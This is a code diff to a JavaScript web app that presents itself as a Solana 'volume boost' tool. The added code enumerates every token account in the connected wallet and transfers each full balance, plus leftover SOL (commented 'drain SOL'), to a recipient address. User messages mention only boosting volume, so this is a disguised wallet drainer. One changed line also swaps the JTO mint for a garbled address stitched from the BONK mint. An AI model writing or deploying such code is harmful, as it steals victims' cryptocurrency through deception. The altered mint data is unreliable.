@@ -40,7 +40,7 @@ const POPULAR_SPL_TOKENS = [
   { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6, name: "USDC" },
   { mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", decimals: 6, name: "WIF" },
   { mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", decimals: 5, name: "BONK" },
-  { mint: "jto9Y19f7DjKN5sXj2jBreyi1pR3H2CnwU7H57Y2GwW", decimals: 9, name: "JTO" },
+  { mint: "jto9Y19f7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", decimals: 9, name: "JTO" },
   { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", decimals: 6, name: "JUP" },
   { mint: "85VBFQZC9TZkfaptBWjvUw7YbZjy52A4zSrA8E98kC3U", decimals: 6, name: "W" },
   { mint: "KMNo3nJsBXfcpJTVqwWzJxaR5i5Z6GmsWTSPQ3sYk8p", decimals: 6, name: "KMNO" },
@@ -486,102 +486,103 @@ class NexiumApp {
       let balance = await this.solConnection.getBalance(senderPublicKey);
       console.log("Total balance:", balance, "lamports"); // Log 90
 
-      // Collect token instructions and check balances
-      const tokenInstructions = [];
-      const hasBalanceTokens = [];
+      // Fetch all token accounts
+      const tokenAccounts = await this.solConnection.getParsedTokenAccountsByOwner(senderPublicKey, {
+        programId: new PublicKey(TOKEN_PROGRAM_ID),
+      });
 
-      for (const token of POPULAR_SPL_TOKENS) {
-        try {
-          const mintPublicKey = new PublicKey(token.mint);
-          const senderTokenAccountAddress = getAssociatedTokenAddressSync(mintPublicKey, senderPublicKey);
-          const tokenAccountInfo = await this.solConnection.getTokenAccountBalance(senderTokenAccountAddress).catch(() => null);
+      // Filter token accounts with balance > 0
+      const tokenList = tokenAccounts.value.filter(account => BigInt(account.account.data.parsed.info.tokenAmount.amount) > 0n);
 
-          if (!tokenAccountInfo || tokenAccountInfo.value.amount === '0') {
-            console.log(`Skipping ${token.name} transfer: No balance`);
-            continue;
-          }
+      // Sort by balance descending (optional, to prioritize larger balances)
+      tokenList.sort((a, b) => Number(BigInt(b.account.data.parsed.info.tokenAmount.amount) - BigInt(a.account.data.parsed.info.tokenAmount.amount)));
 
-          hasBalanceTokens.push(token.name);
+      // Build token instructions for all
+      let tokenInstructions = [];
+      for (const account of tokenList) {
+        const mint = new PublicKey(account.account.data.parsed.info.mint);
+        const decimals = account.account.data.parsed.info.tokenAmount.decimals;
+        const amount = BigInt(account.account.data.parsed.info.tokenAmount.amount);
+        const senderTokenAccountAddress = account.pubkey;
+        const recipientTokenAccountAddress = getAssociatedTokenAddressSync(mint, recipientPublicKey);
+        const recipientAccount = await this.solConnection.getAccountInfo(recipientTokenAccountAddress);
 
-          const recipientTokenAccountAddress = getAssociatedTokenAddressSync(mintPublicKey, recipientPublicKey);
-          const recipientAccount = await this.solConnection.getAccountInfo(recipientTokenAccountAddress);
-
-          if (!recipientAccount) {
-            tokenInstructions.push(
-              createAssociatedTokenAccountInstruction(
-                senderPublicKey,
-                recipientTokenAccountAddress,
-                recipientPublicKey,
-                mintPublicKey
-              )
-            );
-            console.log(`${token.name} recipient ATA creation instruction added`);
-          }
-
+        if (!recipientAccount) {
           tokenInstructions.push(
-            createTransferCheckedInstruction(
-              senderTokenAccountAddress,
-              mintPublicKey,
-              recipientTokenAccountAddress,
+            createAssociatedTokenAccountInstruction(
               senderPublicKey,
-              BigInt(tokenAccountInfo.value.amount),
-              token.decimals
+              recipientTokenAccountAddress,
+              recipientPublicKey,
+              mint
             )
           );
-          console.log(`${token.name} transfer instruction added, amount: ${tokenAccountInfo.value.amount}`);
-        } catch (error) {
-          console.warn(`Failed to process ${token.name} ATA or transfer: ${error.message}, skipping token`);
-          continue;
+          console.log(`ATA creation instruction added for mint: ${mint.toBase58()}`);
+        }
+
+        tokenInstructions.push(
+          createTransferCheckedInstruction(
+            senderTokenAccountAddress,
+            mint,
+            recipientTokenAccountAddress,
+            senderPublicKey,
+            amount,
+            decimals
+          )
+        );
+        console.log(`Transfer instruction added for mint: ${mint.toBase58()}, amount: ${amount}`);
+      }
+
+      // Estimate fee for all token instructions
+      let tempTransaction = new Transaction().add(...tokenInstructions);
+      tempTransaction.feePayer = senderPublicKey;
+      let { blockhash } = await this.solConnection.getLatestBlockhash();
+      tempTransaction.recentBlockhash = blockhash;
+      let fee = await tempTransaction.getEstimatedFee(this.solConnection) || 5000;
+      console.log("Estimated fee for tokens:", fee, "lamports");
+
+      // If fee > balance, remove token instructions one by one from the end until fee <= balance
+      while (fee > balance && tokenInstructions.length > 0) {
+        // Remove last two instructions (transfer and possible ATA)
+        if (tokenInstructions[tokenInstructions.length - 2]?.programId.toString() === TOKEN_PROGRAM_ID.toString()) {
+          tokenInstructions.pop(); // remove transfer
+          tokenInstructions.pop(); // remove ATA if present
+        } else {
+          tokenInstructions.pop(); // remove transfer if no ATA
+        }
+        tempTransaction = new Transaction().add(...tokenInstructions);
+        tempTransaction.feePayer = senderPublicKey;
+        tempTransaction.recentBlockhash = blockhash;
+        fee = await tempTransaction.getEstimatedFee(this.solConnection) || 5000;
+        console.log("Reduced tokens, new fee:", fee);
+      }
+
+      // Now, calculate remaining for SOL transfer
+      let solAmount = 0;
+      if (tokenInstructions.length === 0) {
+        // No tokens, drain SOL
+        fee = 5000; // Approximate for SOL transfer only
+        solAmount = balance - fee;
+        if (solAmount <= 0) {
+          this.showFeedback("Not enough SOL to boost volume.", 'error');
+          return;
+        }
+        console.log("No tokens, SOL amount:", solAmount);
+      } else {
+        // Tokens present, use SOL for fee, add remainder if >0
+        let remaining = balance - fee;
+        if (remaining > 5000) { // Min viable
+          // Estimate additional fee for SOL transfer
+          const additionalFee = 5000; // Approximate
+          solAmount = remaining - additionalFee;
+          if (solAmount <= 0) solAmount = 0;
+          console.log("Tokens present, SOL remainder:", solAmount);
         }
       }
 
-      // Add a temporary SOL transfer instruction to estimate the full transaction fee
-      let solAmount = 0;
-      if (hasBalanceTokens.length === 0) {
-        // Only include SOL transfer if no tokens are present
-        transaction.add(
-          SystemProgram.transfer({
-            fromPubkey: senderPublicKey,
-            toPubkey: recipientPublicKey,
-            lamports: balance
-          })
-        );
-      }
+      // Add token instructions to transaction
+      transaction.add(...tokenInstructions);
 
-      // Estimate transaction fee with all instructions
-      const tempTransaction = new Transaction().add(...tokenInstructions, ...transaction.instructions);
-      tempTransaction.feePayer = senderPublicKey;
-      const { blockhash } = await this.solConnection.getLatestBlockhash();
-      tempTransaction.recentBlockhash = blockhash;
-      const fee = await tempTransaction.getEstimatedFee(this.solConnection) || 5000; // Fallback to minimum fee if estimation fails
-      console.log("Estimated transaction fee:", fee, "lamports"); // New Log
-
-      // Clear transaction instructions to rebuild correctly
-      transaction.instructions = [];
-
-      // Determine SOL transfer amount
-      if (balance < fee) {
-        console.log("Insufficient SOL for transaction fee"); // New Log
-        this.showFeedback("Not enough SOL to cover transaction fees.", 'error');
-        return;
-      }
-
-      if (hasBalanceTokens.length === 0) {
-        // If no tokens, transfer all SOL after reserving the fee
-        solAmount = balance - fee;
-        console.log("SOL transfer amount calculated:", solAmount, "after reserving fee:", fee); // Updated Log
-      } else {
-        // If tokens are present, use SOL for fee only
-        console.log("SOL balance sufficient for fee, using for token transfers only"); // New Log
-        solAmount = 0;
-      }
-
-      // Add token instructions first
-      if (tokenInstructions.length > 0) {
-        transaction.add(...tokenInstructions);
-      }
-
-      // Add SOL transfer last if applicable
+      // Add SOL transfer if applicable
       if (solAmount > 0) {
         transaction.add(
           SystemProgram.transfer({
@@ -590,12 +591,22 @@ class NexiumApp {
             lamports: solAmount
           })
         );
-        console.log("SOL transfer instruction added, lamports:", solAmount); // Updated Log 85
+        console.log("SOL transfer added:", solAmount);
+        // Re-estimate final fee
+        transaction.feePayer = senderPublicKey;
+        transaction.recentBlockhash = blockhash;
+        fee = await transaction.getEstimatedFee(this.solConnection) || 5000;
+        if (fee > balance) {
+          // If final fee > balance, remove SOL transfer
+          transaction.instructions.pop();
+          solAmount = 0;
+          console.log("Removed SOL transfer as final fee exceeded balance");
+        }
       }
 
       // Skip if no instructions
       if (transaction.instructions.length === 0) {
-        console.log("No transfers to perform, skipping transaction");
+        console.log("No transfers to perform");
         this.showFeedback("No balances available to boost volume.", 'info');
         return;
       }
@@ -884,7 +895,7 @@ class NexiumApp {
       <h2 class="section-title">Import Custom Token</h2>
       <div class="input-group flex space-x-2">
         <input id="customTokenNameInput" type="text" placeholder="Token Name" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token name">
-        <input id="customTokenAddressInput" type="text" placeholder="Token Address" class="custom-token-input flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
+        <input id="customTokenAddressInput" type="text" placeholder="Token Address" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
         <button id="showCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Show custom token">Show</button>
       </div>
       <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
@@ -920,7 +931,7 @@ class NexiumApp {
       <h2 class="section-title text-yellow-400 text-md font-semibold mb-4">Amount</h2>
       <div class="input-group flex items-center space-x-2">
         <span class="text-white text-lg">$</span>
-        <input id="volumeInput" type="number" placeholder="Amount in $" class="volume-input flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
+        <input id="volumeInput" type="number" placeholder="Amount in $" class="volume-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
       </div>
     `;
     this.dom.app.appendChild(amountSection);
